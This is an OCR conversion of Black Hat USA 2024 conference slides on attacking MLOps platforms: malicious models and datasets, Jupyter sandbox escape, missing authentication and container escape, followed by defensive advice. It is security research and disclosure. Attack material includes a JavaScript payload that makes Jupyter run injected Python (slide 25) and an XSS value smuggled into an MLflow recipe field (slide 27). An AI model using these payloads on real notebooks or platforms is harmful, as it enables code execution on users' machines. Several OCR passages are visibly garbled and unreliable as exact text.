---
title: "From MLOps to MLOops - Exposing the Attack Surface of Machine Learning Platforms"
speakers: ["Shachar Menashe"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Shachar Menashe_From MLOps to MLOops - Exposing the Attack Surface of Machine Learning Platforms.pdf"
pages: 49
sha256: "2869c1f88bacfc0e8ec9c25b755f79efe1cced50f8663e8e8f9eb447719d44b5"
text_chars: 20068
ocr_pages: 21
has_ocr: true
redacted_secrets: 0
ocr_confidence: 85.2
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:42:16Z"
---
# From MLOps to MLOops - Exposing the Attack Surface of Machine Learning Platforms

**Speakers:** Shachar Menashe  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Shachar Menashe_From MLOps to MLOops - Exposing the Attack Surface of Machine Learning Platforms.pdf` (49 pages)


## Slide 1

From MLOps to MLOops Exposing the Attack Surface of Machine Learning Platforms

Speaker: Shachar Menashe

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
AUGUST 7-8, 2024
From MLOps to MLOops
Exposing the Attack Surface of Machine Leaming Platfonns
Speaker:
Shachar Menashe
#BHUSA @BlackHatEvents
```

## Slide 2

### whoami

- Shachar Menashe

- Classically - Binary reverse engineer

- In practice - Full-time CVSS assigner :)

- Leading JFrog’s security research teams

   - 0-day, CVE, malware research

- Presenting recent research from our **0-day** team

   - Ori Hollander, Natan Nehorai, Uriya Yavnieli

#BHUSA @BlackHatEvents

## Slide 3

### Org High Value Targets

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 77/100 on the text kept, 53/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat
Org High Value Targets
Experiments >
Product Sales Demand © Provide Feedback (3 Add Description
Packages Choose Packages Options | ° fo) %t Group by
Credentials © © abundant-snis
Use PDi
° © wise-
Push (use
os
o2
° busting
Client’ ° vest
© asteful a . o
Prioritiz © © cetficient-tr
san 23,2028
° © shivering-bo Time rmse
®
```

## Slide 4

### This talk

- Breaking down MLOps platforms to distinct features

- How can each feature be attacked?

- Chaining MLOps attacks for total domination

- l33t “ML Worm” demo

- How to avoid these attacks

#BHUSA @BlackHatEvents

## Slide 5

### What can MLOps do for YOU The ML software supply chain

ML Pipeline Model  Model
Pretrained ModelRegistry Serving

#BHUSA @BlackHatEvents

## Slide 6

### What can MLOps do for YOU **ML Pipeline**

Data Input

_Data Cleaning_

_Pre-processing_

_Model Training_

_Deployment_

#BHUSA @BlackHatEvents

## Slide 7

### What can MLOps do for YOU

\```
@dsl.pipeline(
\```

\```
name='XGBoostTrainer',
)
defxgb_train_pipeline(
output='gs://your-gcs-bucket',
project='your-gcp-project',
train_data='gs://ml-pipeline-playground/sfpd/train.csv',
eval_data='gs://ml-pipeline-playground/sfpd/eval.csv',
...
):
...
\```

\```
_analyze_op= dataproc_analyze_op(
).after(_create_cluster_op).set_display_name('Analyzer')
_transform_op= dataproc_transform_op(
).after(_analyze_op).set_display_name('Transformer')
_train_op= dataproc_train_op(
\```

\```
).after(_transform_op).set_display_name('Trainer’)
\```

\```
...
\```

#BHUSA @BlackHatEvents

## Slide 8

### What can MLOps do for YOU

My_dev_model 0.1
ChatGPT 4.5
CV_model 1.2

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What can MLOps do for YOU
Model Registry
My_ ‘dev. model 0.1
,; Data Scientists CV_ model 1.2 ML a
& testing
Production
& inspect
```

## Slide 9

### What can MLOps do for YOU **Model Registry**

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What can MLOps do for YOU
Model Registry
m [ C 210.0 Experiments Models @@ & GitHub Docs
Registered Models Create Model
© Q
Name =* Latest version Aliased versions Created by Last modified Tags
iris_model_dev Version 17 2023-09-25 12:50:... —
iris_model_prod Version 11 | @ champion § Version 11 | +3 2023-10-26 17:10:... —
iris_model_staging Version 11 2023-09-25 12:46:... —
iris_model_testing Version 1 2023-09-27 13:17:... —
mnist_model_dev Version 12 2023-09-25 12:39:.. —
mnist_model_prod Version 8 Oerelculeim: Version 8 +1 2024-01-19 10:35:... —
mnist_model_staging Version 8 2023-09-25 12:51:... —
```

## Slide 10

### What can MLOps do for YOU

Embedding

Serving

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What can MLOps do for YOU
Model Serving
input Smartphone
training Model 3 l |
Serving
```

## Slide 11

What can MLOps do for YOU **Model Serving / Model as a Service / Inference Server**

**`$ kubectl apply -f - << END`** `apiVersion: machinelearning.seldon.io/v1 kind: SeldonDeployment metadata: name: iris-model namespace: seldon` **Embedding** `spec: name: iris predictors: - graph: implementation: SKLEARN_SERVER` **`modelUri: gs://seldon-models/v1.19.0-dev/sklearn/iris` Serving** `name: classifier`

\```
END
\```

#BHUSA @BlackHatEvents

## Slide 12

### What can MLOps do for YOU

- **“Core” MLOps**

**Auxiliary features**

- **Pipelining / Training**

   - **Dataset Registry**

- **Model Registry**

   - **Experiment tracking**

- **Model Serving**

- **Model Evaluation**

**(also, we didn’t break these yet** ☺ **)**

#BHUSA @BlackHatEvents

## Slide 13

### Which frameworks were evaluated?

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 77/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Which frameworks were evaluated?
mliflow % Kubeflow @&)MEIAFLOW
TT, W&B & Cone
| L
```

## Slide 14

### Inherent vs. Implementation Vulns

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Inherent vs. Implementation Vulns
AECVE-2020-22083 Detail
Disputed
Current Description
jsonpickle through 1.4.1 allows remote code execution during deserialization of a malicious
payload through the decode() function. Note: It has been argued that this is expected and clearly
documented behaviour. pickle is known to be capable of causing arbitrary code execution, and
must not be used with un-trusted data
```

## Slide 15

### Inherent vs. Implementation Vulns

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Q >
black hat
USA 2024 :
Inherent vs. Implementation Vulns
Warning: The pickle module is not secure. Only unpickle data you trust.
It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never
unpickle data that could have come from an untrusted source, or that could have been tampered with.
Consider signing data with hmac if you need to ensure that it has not been tampered with.
Safer serialization formats such as json may be more appropriate if you are processing untrusted data. See
Comparison with json.
```

## Slide 16

### Inherent vs. Implementation Vulns

## **But ML is a new field…**

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 96/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Inherent vs. Implementation Vulns
But ML is a new field...
Software Update Unavailable
Software Update is not available at
this time. Try again later.
```

## Slide 17

### Inherent – Malicious Models

(Some) **Models are code!!! Code execution on load**

Pickle

Dill

Joblib

Numpy

TorchScript

Keras H5

SavedModel

Protobuf

TFLite

Safetensors

MsgPack

PMML

#BHUSA @BlackHatEvents

## Slide 18

### Inherent – Malicious Models

\```
fromkeras.modelsimportload_model
m= load_model('vgg16_light/tf_model.h5')
\```

#BHUSA @BlackHatEvents

## Slide 19

### Inherent – Malicious Datasets

- Datasets are just CSVs, right?

- Check your formats and APIs!

#BHUSA @BlackHatEvents

## Slide 20

### Inherent – Malicious Datasets

\```
fromdatasets importload_dataset
ds = load_dataset("hails/mmlu_no_train")
\```

#BHUSA @BlackHatEvents

## Slide 21

### Inherent – Malicious Datasets

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA 2024 | a
Inherent — Malicious Datasets
Tasks: Question Answering Languages: English License:
® Dataset card ‘IE Files and versions ® Community
A dataset loading script should have the same name as a dataset repository or
@ hails @ davzoku Convert da djrectory. For example, a repository named my_dataset should contain
me all my_dataset.py script. This way it can be loaded with:
( .gitattributes © 2.31 kB
[) README.md © 1.12 kB
1 data.tar © 166 MB LFS
4 mmiu_no_train.py © 5.86 kB
```

## Slide 22

### Inherent – Malicious Datasets

\```
fromdatasets importload_dataset
ds = load_dataset("hails/mmlu_no_train")
\```

#BHUSA @BlackHatEvents

## Slide 23

### Inherent – Jupyter Sandbox Escape Notebooks are invaluable for developing ML models

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 78/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat
Inherent — Jupyter Sandbox Escape
Notebooks are invaluable for developing ML models
: Jupyter Optical Coherence Tomography-Copy1 Last Checkpoint: Last Sunday at 6:14 PM (autosaved)
Contents 2% 1.3.3 Fourier Domain OCT (FDOCT)
erence Tomography
1.1 Imports, preliminari
1.2 Imanging
+ 13 OCT The
In FDOCT, the different wavelengths are collected on a spectrometer, with Nx pixels, and spectral resolution 6,.
Returning again to Eq. (8) (see, e.g., Izatt and Choma (Izatt JA, Choma M.A. (2008) Theory of Optical Coherence Tomography. In: Drexler W., Fujimoto J.G.
(eds) Optical Coherence Tomography. Biological and Medical Physics, Biomedical Engineering. Springer, Berlin, Heidelberg; doi: http: 07/978
¥ 1.3.1 Comments and calcula
TDOCT: SNR and N <p Y al arch Quora
| +153 Fourier Domain OCT ( +2 say [3 /RaR, cos (2k(z — “| " Cross — correlation terms " a) (Q) Q Search Quora
1.3.3.2 Int d Oo N
1.3.3.4 FDOCT: SNR and 2 rime
oe oe In the FDOCT configurati held fixed bd 5
7 Ss T: SI in the configuration, zp is held fixe
4 Staten guatn =n Why do so many machine learning tutorials use jupyter
1.5 Potential laser sources In [23]:| lambda_@ = 1.5500
k_@ = 2.0*np.pi/lambda_@ b k?
Dk = 2.0*np.pi*Dlambda_@/lambda_e**2.0
k_range = np.linspace(-3.@*Dk+k_@, +3.0"Dk+k_@, 10000) Ya, Answer >) Follow - 3 32 Request @) O Vv
(k_range - k_@)/Dk)**2.0)) \
'2.@E-4)*(np.exp(-((k_range - k_@)/Dk)**2.0)) \
y*(np-exp(-((k_range - k 0) Das All related (32) V Sort | Recommended v
TD_OCT_signal = (np .exp(-(
In [26]: fig_disp
— signal
```

## Slide 24

### Inherent – Jupyter Sandbox Escape **Simple DOM manipulation JS payload**

- Add new code cell

• Fill cell with Python code • Run the cell

#BHUSA @BlackHatEvents

## Slide 25

### Inherent – Jupyter Sandbox Escape

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Inherent — Jupyter Sandbox Escape
function simulateMouseClick(element)
var mouseClickEvents = [‘mousedown’, ‘click’, ‘mouseup'];
mouseClickEvents.forEach(mouseEventType =>
new MouseEvent(mouseEventType, view: window, bubbles: true, cancelable: true, buttons: 1 }) ) ya
var run_btn = null;
var plus_btn = null;
if (b.title == "Run this cell and advance (Shift+Enter)")
run_btn = b;
else if (b.title == "Insert a cell below (B)") 0
plus_btn = b;
//add new input cell
simulateMouseClick(plus_btn);
var code = “import os ; os.system("calc")”
//wait for the cell to load
setTimeout(() =>
//write python code to the input cell 7 8 9 x
var inpArr = document.getElementsByClassName(‘cm-content');
var inp = inpArr[inpArr.length - 2]; //get the input box of the new cell
var html = ''; _—
//add the code to the new cell 4 5 6
code.split('\n').forEach(line =>
html += ‘<div class="cm-line">' + line + ‘<br></div>'; 1 2 3 +
inp.innerHTML = html;
simulateMouseClick(inp) ; //focus on the cell's input box + (0)
simulateMouseClick(run_btn) //run
» "1000");
```

## Slide 26

### Inherent – Jupyter Sandbox Escape

So - just don’t run untrusted code in Jupyter, right?

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Inherent — Jupyter Sandbox Escape
Pmain recipe.yaml
So - just don’t r
File Edit
Search: FIXME: :REQUIRED Use Enter and Shiftt+tEnter to navigate results
4 # recipe.yamt 1S tne main conriguration T1Le Tor an MLTLOW kecipe.
# Required recipe parameters should be defined in this file with either concrete values or
# variables such as {{ INGEST_DATA_LOCATION }}.
Variables must be dereferenced in a profile YAML file, located under ‘profiles/*.
# See ‘profiles/local.yaml* for example usage. One may switch among profiles quickly by
# providing a profile name such as ‘local* in the Recipe object constructor:
# “r = Recipe(profile="local") *
#
JECVE-2024-2713 10 # NOTE: ALL "FIXME::REQUIRED" fields in recipe.yaml and profiles/*.yaml must be set correctly
ake # to adapt this template to a specific regression problem. To find all required fields,
12 # under the root directory of this recipe, type on a unix-like command line:
° ° 13. # $> grep "# FIXME::REQUIRED:" recipe.yaml profiles/*.yaml
Description ae
15 # NOTE: YAML does not support tabs for indentation. Please use spaces and ensure that all YAML
16 # files are properly formatted.
Insufficient sanitization in 18 recipe: “regression/v1"
19 # FIXME::REQUIRED: Specifies the target column name for model training and evaluation.
20 target_col: ""
2a) # FIXME: :REQUIRED: Sets the primary metric to use to evaluate model performance. This primary
22 # metric is used to select best performing models in MLflow UI as well as in
23 # train and evaluation step.
24 # Built-in metrics are: example_count, mean_absolute_error, mean_squared_error
25 # root_mean_squared_error, sum_on_label, mean_on_label, r2_score, max_error,
26 # mean_absolute_percentage_error
27 primary_metric: ""
28 steps:
29 # Specifies the dataset to use for model development
30 ingest: {{INGEST_CONFIG}}
31 split:
32 #
33 # FIXME::OPTIONAL: Adjust the train/validation/test split ratios below.
```

## Slide 27

Inherent – Jupyter Sandbox Escape **Shady Server**

\```
recipe: "classification/v1"
target_col: "<script>alert('pwned!');</script>"
frommlflow.recipesimportRecipe
recipe= Recipe(profile="local").run()
\```

**Data Scientist**

#BHUSA @BlackHatEvents

## Slide 28

### Inherent – Jupyter Sandbox Escape

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
nt —- Jupyter Sandbox Escape
. localhost:8888 says
(
File Edit Vie 3
>
In [*]: from mlflow.recipes import t¢ y
recipe = Recipe(profile="local"). runt)
```

## Slide 29

### Let’s talk MLOps implementation issues

- Not inherent due to used formats

- Classic issues that are more likely to plague MLOps

- Or – cause heightened severity

- Unlike inherent, should have a CVE

- Spoiler – chains nicely with inherent issues

#BHUSA @BlackHatEvents

## Slide 30

### Implementation – Lack of authentication

\```
@dsl.pipeline(
\```

\```
name='XGBoostTrainer',
)
defxgb_train_pipeline(
output='gs://your-gcs-bucket',
project='your-gcp-project',
train_data='gs://ml-pipeline-playground/sfpd/train.csv',
eval_data='gs://ml-pipeline-playground/sfpd/eval.csv',
...
):
...
\```

\```
_analyze_op= dataproc_analyze_op(
).after(_create_cluster_op).set_display_name('Analyzer')
\```

**Pipeline AKA “Code execution as a feature”**

**Dockerized? Platform dependent**

**What about authentication?**

\```
_transform_op= dataproc_transform_op(
\```

\```
).after(_analyze_op).set_display_name('Transformer')
\```

\```
_train_op= dataproc_train_op(
\```

\```
).after(_transform_op).set_display_name('Trainer’)
\```

\```
...
\```

#BHUSA @BlackHatEvents

## Slide 31

### Implementation – Lack of authentication

**Pipelines?**

**Built-in Auth?**

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 78/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Implementation -— Lack of authentication
Pipelines? Built-in Auth?
d+ CORE J x
J x
S) METAFLOW J x
```

## Slide 32

### Implementation – Lack of authentication

**Ray, as stated in its documentation, is not intended for use outside of a strictly controlled network environment**

#BHUSA @BlackHatEvents

## Slide 33

### Implementation – Lack of authentication

**Exposed to WAN**

**No Auth**

**RCE as a feature**

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Implementation -— Lack of authentication
= © oligo
ShadowRay: First Known
Attack Campaign Targeting
Al Workloads Actively
Exploited In The Wild
& z. e Avi Lumelsky, Guy Kaplan. Gal Elbaz
Gs March 26, 2024
Exposed to WAN No Auth RCE as a feature
```

## Slide 34

### Implementation – Container escape Container escape has **heightened** impact on MLOps platforms

Code execution is expected Editing pipeline requires high privileges (?)

Code execution is a side-effect Regular users can upload models

#BHUSA @BlackHatEvents

## Slide 35

### Implementation – Container escape Container escape has **heightened** impact on MLOps platforms

Lateral movement in organization Access to other users’ resources

#BHUSA @BlackHatEvents

## Slide 36

### Implementation – Container escape

**Upload malicious model**

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat
Implementation -— Container escape
Upload malicious model
Predictor Service
Description
Queue Proxy A heap-based buffer overflow flaw was found in the way the legacy_parse_param function in the Filesystem Context functionality of the Linux
kernel verified the supplied parameters length. An unprivileged (in case of unprivileged user namespaces enabled, otherwise needs
namespaced CAP_SYS_ADMIN privilege) local user able to open a filesystem that does not support the Filesystem Context API (and thus
fallbacks to legacy handling) could use this flaw to escalate their privileges on the system.
Model Server
—_f + M etrics CVSS Version 4.0 CVSS Version 2.0
NVD enrichment efforts reference publicly available information to associate vector strings. CVSS information contributed by other sources is also displayed.
Storage Initializer CVSS 3.x Severity and Vector Strings:
. — NIST: NVD B Ss H Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

## Slide 37

### Implementation – Container escape

**Upload malicious model**

**Other stuff** ™

**“Best PyPI package for CV?”**

**“MyCoolRAT v99.9”**

Exfiltrate

#BHUSA @BlackHatEvents

## Slide 38

### Implementation – Container escape

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
black hat
Implementation -— Container escape
Al-as-a-Service attack flow
70% of organizations are
already using Al services in
their cloud environments
ws, H uggi ng Fa ce Al-as-a-Service provider's inference platform -
running customers’ Al models
a Legitimate customers run Al
models on the service
customer models
. Attacker gains access to all fe xt aL
Org A/B/C... mo
Shared Infrastructure .
. Attacker performs lateral movement W S
through the shared Al infrastructure Lis =]
1. Attacker uploads malicious rd
\i Al model . Attacker runs malicious Al <2
WIZ Research
```

## Slide 39

### Implementation – Still immature

- **MLOps platforms are still fresh**

- **AI experts are NOT security experts**

**<u>CVEs in the past 2 years</u>**

**<u>JFrog 2024 external disclosures</u>**

**20 ML/AI CVEs 13 different components**

**15 Critical 2 Critical 23 High 9 High**

#BHUSA @BlackHatEvents

## Slide 40

## **Attacker’s view – Putting it all together**

#BHUSA @BlackHatEvents

## Slide 41

#### Chain1 – Client-side malicious models

Upload model

**Org Network**

**Infected ML Models**

**Request malicious**

`# Download & load model from HF` **model**

ML Pipeline

\```
fromtransformers importAutoTokenizer, AutoModelForCausalLM
tokenizer= AutoTokenizer.from_pretrained("evildoer/badmodel")
model= AutoModelForCausalLM.from_pretrained("evildoer/badmodel")
\```

**Request latest ML model**

**Breach registry Model Registry** `# Fetch & load latest model version (mlflow example)` **Data** **_No auth_ ML Inference** `import mlflow.pyfunc` **Scientist** **_Stored creds_** `model_name = "some_model" model_alias = "some_alias"`

`export MLFLOW_TRACKING_URI` **_Exploitation_** `="http://10.90.120.74:1234"model = mlflow.pyfunc.load_model(model_uri=f"models:/{model_name}@{model_alias}") export MLFLOW_TRACKING_USERNAME="data"` **Data Scientist** `export MLFLOW_TRACKING_PASSWORD="science"`

#BHUSA @BlackHatEvents

## Slide 42

#### Chain2 – Server-side malicious models

Org Network #1 / WAN Org Network #2
Inference Server
Container Escape
CVE
Platform-specific
Upload malicious model
Serving
Container

#BHUSA @BlackHatEvents

## Slide 43

### Mapping features to attacks

**Known MLOps Feature How to Exploit Post Exploitation Victims** Lack of authentication Client RCE **Model Registry** Stored credentials (malicious model) <u>CVE / 0-day-dayday</u> Client RCE **Dataset Registry** Same as above (malicious dataset) Server RCE **Model Serving** Container Escape

Lack of authentication **Model Registry** Stored credentials <u>CVE / 0-day-dayday</u> **Dataset Registry** Same as above Server RCE **Model Serving** (malicious model)

Server RCE **ML Pipeline** Container Escape (auth bypass)

#BHUSA @BlackHatEvents

## Slide 44

**DEMO TIME – Let’s exploit a 0-day*!**

**Model Registry**

Remote PrivEsc

Data Scientist

#BHUSA @BlackHatEvents

## Slide 45

## **What about some good news?**

#BHUSA @BlackHatEvents

## Slide 46

### Data scientists rejoice! Jupyter XSSGuard

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 74/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Data scientists rejoice! Jupyter XSSGuard
Untitled.ipynb x | +
A+ Xk O O > @ C » Code v Python 3 (ipykernel) ©
import pandas as pd
a
c im Lo Elements Console Sources Network Performance Memory 2? ©@1A2 Ge fs} : x
s = io.StringI0O(
_p. _ & Unsatisfied version 4.6.11 from @jupyterlab/application-top of shared singleton module consumes: 73
= @jupyterlab/rendermime (required *4.2.2)
[8]: JupyterLab extension jupyterlab_output_iframe is activated!
© * Uncaught DOMException: |Failed to read the ‘cookie' property from "Document": The
Qa document is sandboxed and Tacks the “allow-Same-origin tleg.
at about:sredoc:13:92
lb
2c
```

## Slide 47

### Hugging Face Datasets safe by default

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA 2024 ,
Hugging Face Datasets safe by default
A albertvillanova released this 3 weeks ago —_- 31 commits to main since this release © 2.20.0 -O 98fdc9e &
Important
e Remove default trust_remote_code=True by @lhoestgq in #6954
© datasets with a python loading script now require passing trust_remote_code=True to be used
```

## Slide 48

## Sound Bytes for deploying MLOps

• Using Pipelines / Model serving / Model registry?
• Check containerization
• Check and enable auth
• Models are code!
• Model serving privs == code execution privs
• Prefer working with safe model formats (ex. Safetensors)
• Brief anybody that loads ML models
• Scan models - picklescan
• Using Jupyter? Consider installing XSSGuard

• **Org’s MLOps platform is a high value target!**

#BHUSA @BlackHatEvents

## Slide 49

# Thank you!

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 56/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Thank you! ©
#BHUSA @BlackHatEvents
```
